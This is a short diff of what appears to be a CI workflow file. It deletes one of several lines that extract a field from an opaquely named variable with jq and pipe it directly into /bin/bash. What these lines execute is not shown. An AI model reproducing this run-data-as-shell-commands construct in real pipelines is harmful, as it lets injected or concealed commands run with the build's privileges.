@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$q380" | jq -r .sosjn0169 | /bin/bash
           echo $iom8376 | jq -r .jw2 | /bin/bash
           printf '%s' "$baez117" | jq -r .ndibk4 | /bin/bash
-          echo $dw9 | jq -r .pecmb8600 | /bin/bash
           printf '%s' "$frqe3" | jq -r .uuxh4 | /bin/bash
 
       - name: Archive results
